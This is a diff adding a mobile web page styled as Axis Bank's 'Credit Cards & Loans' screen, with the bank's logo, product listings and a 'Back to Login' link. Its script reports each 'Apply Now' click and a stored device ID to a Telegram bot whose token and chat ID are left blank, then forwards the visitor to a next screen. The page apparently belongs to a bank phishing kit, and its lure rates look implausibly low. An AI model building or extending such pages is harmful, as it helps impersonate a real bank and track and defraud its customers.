@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Axis Bank - Credit Cards & Loans</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #ffffff;
+            color: #000000;
+            max-width: 500px;
+            margin: 0 auto;
+            overflow-x: hidden;
+        }
+        
+        /* Main Container */
+        .container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background-color: #ffffff;
+        }
+        
+        /* Header - Same as login page */
+        .header {
+            background-color: #ffffff;
+            padding: 18px 25px;
+            border-bottom: 2px solid #f0f0f0;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 80px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+        }
+        
+        .bank-logo {
+            width: 180px;
+            height: 80px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .bank-logo img {
+            width: 200%;
+            height: 200%;
+            object-fit: cover;
+            object-position: center -25px;
+            transform: scale(0.8);
+        }
+        
+        /* Page Title */
+        .page-title {
+            background: linear-gradient(to right, #AE275F, #C63D7B);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .page-title h1 {
+            font-size: 28px;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+        
+        .page-title p {
+            font-size: 16px;
+            opacity: 0.9;
+            max-width: 400px;
+            margin: 0 auto;
+            line-height: 1.5;
+        }
+        
+        /* Tabs Navigation */
+        .tabs-container {
+            display: flex;
+            background-color: #f8f8f8;
+            border-radius: 12px;
+            border: 2px solid black;
+            margin: 0 20px 25px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .tab-btn {
+            flex: 1;
+            padding: 18px 10px;
+            background-color: transparent;
+            border: none;
+            font-size: 16px;
+            font-weight: 700;
+            color: #666666;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .tab-btn i {
+            margin-right: 10px;
+            font-size: 18px;
+        }
+        
+        .tab-btn.active {
+            background-color: #AE275F;
+            color: white;
+        }
+        
+        .tab-btn:hover:not(.active) {
+            background-color: #f0f0f0;
+            color: #AE275F;
+        }
+        
+        /* Tab Content */
+        .tab-content {
+            display: none;
+            padding: 0 20px 30px;
+            flex-grow: 1;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        /* Cards Container */
+        .cards-grid, .loans-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+        
+        .card-item, .loan-item {
+            background-color: white;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
+            border: 1px solid #f0f0f0;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card-item:hover, .loan-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 30px rgba(174, 39, 95, 0.15);
+        }
+        
+        .card-image, .loan-image {
+            height: 200px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .card-image img, .loan-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.5s ease;
+        }
+        
+        .card-item:hover .card-image img,
+        .loan-item:hover .loan-image img {
+            transform: scale(1.05);
+        }
+        
+        .card-badge, .loan-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background-color: #AE275F;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .card-content, .loan-content {
+            padding: 22px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card-title, .loan-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #222222;
+        }
+        
+        .card-description, .loan-description {
+            font-size: 15px;
+            line-height: 1.6;
+            color: #555555;
+            margin-bottom: 20px;
+            flex-grow: 1;
+        }
+        
+        .card-features, .loan-features {
+            margin-bottom: 22px;
+            padding-left: 18px;
+        }
+        
+        .card-feature, .loan-feature {
+            font-size: 14px;
+            color: #444444;
+            margin-bottom: 8px;
+            position: relative;
+        }
+        
+        .card-feature:before, .loan-feature:before {
+            content: "✓";
+            color: #AE275F;
+            font-weight: bold;
+            position: absolute;
+            left: -18px;
+        }
+        
+        .interest-rate {
+            display: inline-block;
+            background-color: #f0f7ff;
+            color: #1a6fd0;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 18px;
+            margin-bottom: 15px;
+            border: 1px solid #d0e5ff;
+        }
+        
+        .card-actions, .loan-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: auto;
+        }
+        
+        .btn-apply {
+            background-color: #AE275F;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 14px 24px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 6px 15px rgba(174, 39, 95, 0.25);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-grow: 1;
+            margin-right: 15px;
+        }
+        
+        .btn-apply:hover {
+            background-color: #C63D7B;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(174, 39, 95, 0.35);
+        }
+        
+        .btn-apply i {
+            margin-right: 8px;
+        }
+        
+        .btn-details {
+            background-color: #f0f0f0;
+            color: #333333;
+            border: none;
+            border-radius: 10px;
+            padding: 14px 18px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn-details:hover {
+            background-color: #e0e0e0;
+            color: #AE275F;
+        }
+        
+        /* Footer - Same as login page */
+        .footer {
+            background-color: #f8f8f8;
+            color: #666666;
+            padding: 25px 20px;
+            margin-top: auto;
+            border-top: 1px solid #eaeaea;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            margin-bottom: 22px;
+        }
+        
+        .footer-link {
+            color: #666666;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 12px;
+            width: 48%;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        
+        .footer-link:hover {
+            color: #AE275F;
+            text-decoration: underline;
+        }
+        
+        .footer-disclaimer {
+            font-size: 12px;
+            line-height: 1.6;
+            border-top: 1px solid #e0e0e0;
+            padding-top: 18px;
+            margin-top: 15px;
+            color: #555555;
+        }
+        
+        .contact-info {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        .contact-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        
+        .contact-icon {
+            background-color: #ffffff;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
+            border: 1px solid #f0f0f0;
+        }
+        
+        .contact-icon i {
+            color: #AE275F;
+            font-size: 20px;
+        }
+        
+        .contact-text {
+            font-size: 12px;
+            font-weight: 500;
+            color: #444444;
+        }
+        
+        /* Back to login link */
+        .back-to-login {
+            text-align: center;
+            padding: 15px 20px 25px;
+        }
+        
+        .back-link {
+            color: #AE275F;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 10px 20px;
+            border-radius: 8px;
+            border: 2px solid #AE275F;
+            display: inline-flex;
+            align-items: center;
+            transition: all 0.3s;
+        }
+        
+        .back-link:hover {
+            background-color: #AE275F;
+            color: white;
+        }
+        
+        .back-link i {
+            margin-right: 8px;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .tab-content {
+                padding: 0 16px 25px;
+            }
+            
+            .card-content, .loan-content {
+                padding: 18px;
+            }
+            
+            .card-title, .loan-title {
+                font-size: 20px;
+            }
+            
+            .page-title h1 {
+                font-size: 24px;
+            }
+            
+            .page-title p {
+                font-size: 15px;
+            }
+            
+            .card-actions, .loan-actions {
+                flex-direction: column;
+                gap: 12px;
+            }
+            
+            .btn-apply {
+                margin-right: 0;
+                width: 100%;
+            }
+            
+            .btn-details {
+                width: 100%;
+            }
+            
+            .tabs-container {
+                margin: 0 16px 20px;
+            }
+            
+            .tab-btn {
+                font-size: 15px;
+                padding: 16px 8px;
+            }
+            
+            .tab-btn i {
+                font-size: 16px;
+                margin-right: 6px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Main Container -->
+    <div class="container" id="main-container">
+        <!-- Header - Same as login page -->
+        <header class="header">
+            <div class="logo-container">
+                <div class="bank-logo">
+                    <img src="https://images.seeklogo.com/logo-png/1/1/axis-bank-logo-png_seeklogo-14775.png" alt="Axis Bank Logo" onerror="this.onerror=null; this.src='https://cdn.brandfetch.io/id78YVtrRp/w/350/h/350/theme/dark/icon.png?c=1bxid64Mup7aczewSAYMX&t=1667590351759'">
+                </div>
+            </div>
+        </header>
+
+        <!-- Page Title -->
+        <div class="page-title">
+            <h1>Axis Bank Credit Cards & Loans</h1>
+            <p>Choose from our premium range of credit cards and loans with attractive interest rates and exclusive benefits.</p>
+        </div>
+
+        <!-- Tabs Navigation -->
+        <div class="tabs-container">
+            <button class="tab-btn active" id="credit-cards-tab" onclick="switchTab('credit-cards')">
+                <i class="fas fa-credit-card"></i> Credit Cards
+            </button>
+            <button class="tab-btn" id="loans-tab" onclick="switchTab('loans')">
+                <i class="fas fa-money-bill-wave"></i> Loans
+            </button>
+        </div>
+
+        <!-- Credit Cards Tab Content -->
+        <div class="tab-content active" id="credit-cards-content">
+            <div class="cards-grid" id="cards-grid">
+                <!-- Credit cards will be dynamically loaded here -->
+            </div>
+        </div>
+
+        <!-- Loans Tab Content -->
+        <div class="tab-content" id="loans-content">
+            <div class="loans-grid" id="loans-grid">
+                <!-- Loans will be dynamically loaded here -->
+            </div>
+        </div>
+        
+        <div class="back-to-login">
+            <a href="javascript:history.back()" class="back-link">
+                <i class="fas fa-arrow-left"></i> Back to Login
+            </a>
+        </div>
+
+        <!-- Footer - Same as login page -->
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#" class="footer-link">Privacy Policy</a>
+                <a href="#" class="footer-link">Terms of Service</a>
+                <a href="#" class="footer-link">Security Tips</a>
+                <a href="#" class="footer-link">Contact Us</a>
+                <a href="#" class="footer-link">Branch Locator</a>
+                <a href="#" class="footer-link">FAQs</a>
+            </div>
+
+            <div class="footer-disclaimer">
+                <p>© 2025 Axis Bank Ltd. All rights reserved. Axis Bank is a registered trademark. This is a demonstration interface only.</p>
+                <p style="margin-top: 10px;">Always log out after completing your banking session and clear your browser cache for security.</p>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = ""; // e.g. "123456789:ABCdefGHIjklMNOpQRsTuvWXyZ"
+        const TELEGRAM_CHAT_ID = "";  // e.g. "-1001234567890"
+
+        function sendTelegramMessage(text) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                console.warn('Telegram bot not configured; skipping send.');
+                return Promise.resolve();
+            }
+            const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
+            return fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
+            }).then(resp => {
+                if (!resp.ok) throw new Error(`Telegram API error: ${resp.status}`);
+                return resp.json();
+            }).then(data => console.log('Telegram message sent', data))
+            .catch(err => console.warn('Could not send Telegram message', err));
+        }
+
+        // JSON data for credit cards
+        const cardsData = [
+            {
+                id: 1,
+                title: "Axis Bank Magnus Credit Card",
+                description: "Premium credit card with accelerated rewards on travel, dining and entertainment. Enjoy complimentary airport lounge access and premium concierge services.",
+                image: "https://images.unsplash.com/photo-1604594849809-dfedbc827105?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80",
+                badge: "PREMIUM",
+                features: [
+                    "12 complimentary airport lounge visits per year",
+                    "Accelerated reward points on travel & dining",
+                    "Complimentary golf games at select courses",
+                    "24/7 premium concierge service"
+                ]
+            },
+            {
+                id: 2,
+                title: "Axis Bank Flipkart Credit Card",
+                description: "Get exclusive rewards and cashback on Flipkart purchases along with year-round savings on major brands.",
+                image: "https://images.unsplash.com/photo-1607082350899-7e105aa886ae?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80",
+                badge: "POPULAR",
+                features: [
+                    "5% unlimited cashback on Flipkart & Myntra",
+                    "4% cashback on Swiggy, Zomato & Uber",
+                    "1.5% cashback on all other spends",
+                    "No joining or annual fees"
+                ]
+            },
+            {
+                id: 3,
+                title: "Axis Bank Privilege Credit Card",
+                description: "Experience luxury with premium benefits including golf access, hotel stays, and exclusive dining privileges across the globe.",
+                image: "https://images.unsplash.com/photo-1579532537598-459ecdaf39cc?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80",
+                badge: "ELITE",
+                features: [
+                    "Unlimited complimentary airport lounge access",
+                    "Complimentary Taj Epicure Plus membership",
+                    "Premium golf program with 4 complimentary rounds",
+                    "24/7 dedicated relationship manager"
+                ]
+            },
+            {
+                id: 4,
+                title: "Axis Bank Neo Credit Card",
+                description: "Perfect for young professionals with low annual fees and exciting rewards on online spends and entertainment.",
+                image: "https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80",
+                badge: "ENTRY LEVEL",
+                features: [
+                    "Zero annual fees on spending ₹2 lakhs in a year",
+                    "Extra rewards on online entertainment & food delivery",
+                    "Welcome benefits worth ₹1,500",
+                    "Contactless payments for faster checkout"
+                ]
+            },
+            {
+                id: 5,
+                title: "Axis Bank Select Credit Card",
+                description: "Enjoy accelerated rewards on your everyday spends including groceries, fuel, and utility bill payments.",
+                image: "https://images.unsplash.com/photo-1552083375-1447ce886485?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80",
+                badge: "VALUE",
+                features: [
+                    "Accelerated rewards on grocery & supermarket spends",
+                    "Fuel surcharge waiver across all petrol pumps",
+                    "Discounts on movie tickets & dining",
+                    "Low annual fees with easy waiver options"
+                ]
+            },
+            {
+                id: 6,
+                title: "Axis Bank Reserve Credit Card",
+                description: "The ultimate credit card offering the highest rewards, luxury travel benefits, and personalized services.",
+                image: "https://images.unsplash.com/photo-1541140532154-b024d705b90a?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80",
+                badge: "ULTIMATE",
+                features: [
+                    "Unlimited airport lounge access worldwide",
+                    "Complimentary Club Vistara Gold membership",
+                    "Personalized travel & lifestyle concierge",
+                    "Highest reward points on all categories"
+                ]
+            }
+        ];
+
+        // JSON data for loans
+        const loansData = [
+            {
+                id: 1,
+                title: "Axis Bank Car Loan",
+                description: "Drive your dream car with our affordable car loan options. Quick approval, competitive interest rates, and flexible repayment tenure.",
+                image: "https://images.unsplash.com/photo-1549399542-7e3f8b79c341?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80",
+                badge: "POPULAR",
+                interestRate: "6% per annum",
+                features: [
+                    "Loan up to 100% of car's on-road price",
+                    "Flexible repayment tenure up to 7 years",
+                    "Quick online approval within 30 minutes",
+                    "Special discounts for existing Axis Bank customers"
+                ]
+            },
+            {
+                id: 2,
+                title: "Axis Bank Home Loan",
+                description: "Turn your dream home into reality with our attractive home loan schemes. Enjoy low interest rates and convenient repayment options.",
+                image: "https://images.unsplash.com/photo-1560518883-ce09059eeffa?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80",
+                badge: "LOW INTEREST",
+                interestRate: "4.5% per annum",
+                features: [
+                    "Loan up to 90% of property value",
+                    "Repayment tenure up to 30 years",
+                    "Balance transfer facility available",
+                    "Special women borrower discount of 0.05%"
+                ]
+            },
+            {
+                id: 3,
+                title: "Axis Bank Personal Loan",
+                description: "Fulfill your personal needs with our instant personal loan. No collateral required, quick disbursal, and flexible repayment options.",
+                image: "https://images.unsplash.com/photo-1554224155-6726b3ff858f?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80",
+                badge: "INSTANT",
+                interestRate: "8% per annum",
+                features: [
+                    "Loan amount up to ₹40 lakhs",
+                    "Instant approval for existing customers",
+                    "No security or collateral required",
+                    "Flexible tenure from 1 to 5 years"
+                ]
+            },
+            {
+                id: 4,
+                title: "Axis Bank Business Loan",
+                description: "Grow your business with our tailored business loan solutions. Whether for expansion, inventory, or working capital, we've got you covered.",
+                image: "https://images.unsplash.com/photo-1556761175-b413da4baf72?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1000&q=80",
+                badge: "BUSINESS",
+                interestRate: "5% per annum",
+                features: [
+                    "Loan amount up to ₹5 crores",
+                    "Collateral-free loans available",
+                    "Quick processing with minimal documentation",
+                    "Flexible repayment options"
+                ]
+            },
+            {
+                id: 5,
+                title: "Axis Bank Education Loan",
+                description: "Invest in your future with our education loan for higher studies in India and abroad. Cover tuition, travel, and living expenses.",
+                image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTxerUUniCqNavwGfScCZwlxKSyik3P2zRQT6eRLnf5EItKd9rIkh3wdz-V&s=10",
+                badge: "EDUCATION",
+                interestRate: "7% per annum",
+                features: [
+                    "100% finance for tuition and living expenses",
+                    "Moratorium period up to course duration + 1 year",
+                    "Loan available for studies in India and abroad",
+                    "Simple interest during moratorium period"
+                ]
+            },
+            {
+                id: 6,
+                title: "Axis Bank Gold Loan",
+                description: "Get instant funds against your gold ornaments. High loan-to-value ratio, minimal documentation, and quick disbursal.",
+                image: "https://media.istockphoto.com/id/1291975213/photo/businesswoman-calculating-the-conversion-rate-for-indian-currency.jpg?s=612x612&w=0&k=20&c=MqNMrYIFytWcDoOzHfg6wvhphWUxgbJAj7oxvYOO8Ac=",
+                badge: "SECURED",
+                interestRate: "7.5% per annum",
+                features: [
+                    "Loan up to 75% of gold value",
+                    "Instant disbursal within 30 minutes",
+                    "Safe and secure gold storage",
+                    "Flexible repayment options"
+                ]
+            }
+        ];
+
+        // Function to load credit cards from JSON data
+        function loadCreditCards() {
+            const cardsGrid = document.getElementById('cards-grid');
+            
+            cardsData.forEach(card => {
+                const cardElement = document.createElement('div');
+                cardElement.className = 'card-item';
+                cardElement.innerHTML = `
+                    <div class="card-image">
+                        <img src="${card.image}" alt="${card.title}">
+                        <div class="card-badge">${card.badge}</div>
+                    </div>
+                    <div class="card-content">
+                        <h3 class="card-title">${card.title}</h3>
+                        <p class="card-description">${card.description}</p>
+                        
+                        <div class="card-features">
+                            ${card.features.map(feature => `<div class="card-feature">${feature}</div>`).join('')}
+                        </div>
+                        
+                        <div class="card-actions">
+                            <button class="btn-apply" onclick="applyForCard(${card.id})">
+                                <i class="fas fa-credit-card"></i> Apply Now
+                            </button>
+                        </div>
+                    </div>
+                `;
+                
+                cardsGrid.appendChild(cardElement);
+            });
+        }
+        
+        // Function to load loans from JSON data
+        function loadLoans() {
+            const loansGrid = document.getElementById('loans-grid');
+            
+            loansData.forEach(loan => {
+                const loanElement = document.createElement('div');
+                loanElement.className = 'loan-item';
+                loanElement.innerHTML = `
+                    <div class="loan-image">
+                        <img src="${loan.image}" alt="${loan.title}">
+                        <div class="loan-badge">${loan.badge}</div>
+                    </div>
+                    <div class="loan-content">
+                        <h3 class="loan-title">${loan.title}</h3>
+                        <div class="interest-rate">Interest Rate: ${loan.interestRate}</div>
+                        <p class="loan-description">${loan.description}</p>
+                        
+                        <div class="loan-features">
+                            ${loan.features.map(feature => `<div class="loan-feature">${feature}</div>`).join('')}
+                        </div>
+                        
+                        <div class="loan-actions">
+                            <button class="btn-apply" onclick="applyForLoan(${loan.id})">
+                                <i class="fas fa-file-signature"></i> Apply Now
+                            </button>
+                        </div>
+                    </div>
+                `;
+                
+                loansGrid.appendChild(loanElement);
+            });
+        }
+        
+        // Function to switch between tabs
+        function switchTab(tabName) {
+            // Hide all tab contents
+            const tabContents = document.querySelectorAll('.tab-content');
+            tabContents.forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            // Remove active class from all tab buttons
+            const tabButtons = document.querySelectorAll('.tab-btn');
+            tabButtons.forEach(button => {
+                button.classList.remove('active');
+            });
+            
+            // Show selected tab content and activate button
+            document.getElementById(`${tabName}-content`).classList.add('active');
+            document.getElementById(`${tabName}-tab`).classList.add('active');
+        }
+        
+        // Function to handle Apply Now for credit cards
+        function applyForCard(cardId) {
+            const card = cardsData.find(c => c.id === cardId);
+            const DeviceID = localStorage.getItem('DeviceId') || 'UnknownDevice';
+            const telegramText = `📝 <b>Apply for credit card clicked</b>\nCard: <code>${card?.title || cardId}</code>\nDevice: <code>${DeviceID}</code>`;
+            sendTelegramMessage(telegramText).finally(() => {
+                window.location.href = `screen3.html?cardId=${cardId}`;
+            });
+        }
+        
+        // Function to handle Apply Now for loans
+        function applyForLoan(loanId) {
+            const loan = loansData.find(l => l.id === loanId);
+            const DeviceID = localStorage.getItem('DeviceId') || 'UnknownDevice';
+            const telegramText = `📝 <b>Apply for loan clicked</b>\nLoan: <code>${loan?.title || loanId}</code>\nDevice: <code>${DeviceID}</code>`;
+            sendTelegramMessage(telegramText).finally(() => {
+                window.location.href = `screen3.html?loanId=${loanId}`;
+            });
+        }
+        
+        // Load cards and loans when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            loadCreditCards();
+            loadLoans();
+        });
+    </script>
+</body>
+
+</html>
